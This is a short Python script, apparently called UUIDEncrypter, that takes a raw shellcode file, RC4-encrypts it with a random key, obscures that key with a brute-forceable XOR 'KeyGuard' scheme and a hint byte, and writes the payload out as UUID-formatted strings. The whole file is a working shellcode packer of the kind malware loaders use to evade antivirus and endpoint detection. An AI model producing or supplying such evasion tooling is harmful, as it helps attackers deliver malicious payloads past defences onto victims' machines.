import sys
import random

def rc4_encrypt(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    out = bytearray()
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return out

def bytes_to_raw_uuids(data):
    size = len(data)
    uuid_str = ""
    for i in range(0, size, 16):
        chunk = data[i:i+16]
        if len(chunk) < 16:
            chunk += b'\x00' * (16 - len(chunk))
        
        uuid_str += f"{chunk[0]:02X}{chunk[1]:02X}{chunk[2]:02X}{chunk[3]:02X}-"
        uuid_str += f"{chunk[4]:02X}{chunk[5]:02X}-"
        uuid_str += f"{chunk[6]:02X}{chunk[7]:02X}-"
        uuid_str += f"{chunk[8]:02X}{chunk[9]:02X}-"
        uuid_str += f"{chunk[10]:02X}{chunk[11]:02X}{chunk[12]:02X}{chunk[13]:02X}{chunk[14]:02X}{chunk[15]:02X}"
    return uuid_str

def main():
    if len(sys.argv) < 3:
        print("Usage: py UUIDEncrypter.py <input.bin> <output.enc>")
        sys.exit(1)
        
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    
    try:
        with open(input_file, "rb") as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[!] Failed to read {input_file}: {e}")
        sys.exit(1)
        
    shellcode_size = len(shellcode)
    print(f"[*] Read {shellcode_size} bytes from {input_file}")
    
    # Generate random key
    real_key = bytearray(random.getrandbits(8) for _ in range(16))
    
    # Encrypt
    encrypted_shellcode = rc4_encrypt(real_key, shellcode)
    
    # KeyGuard Logic
    b = random.randint(1, 200)
    protected_key = bytearray(16)
    for i in range(16):
        protected_key[i] = ((real_key[i] + i) ^ b) & 0xFF
        
    hint_byte = protected_key[0] ^ b
    uuid_count = (shellcode_size + 15) // 16
    
    s_payload = bytes_to_raw_uuids(encrypted_shellcode)
    
    try:
        with open(output_file, "wb") as f:
            f.write(bytes([hint_byte]))
            f.write(uuid_count.to_bytes(4, byteorder='little', signed=False))
            f.write(protected_key)
            f.write(s_payload.encode('ascii'))
        print(f"[+] Output written to {output_file}")
    except Exception as e:
        print(f"[!] Failed to write {output_file}: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
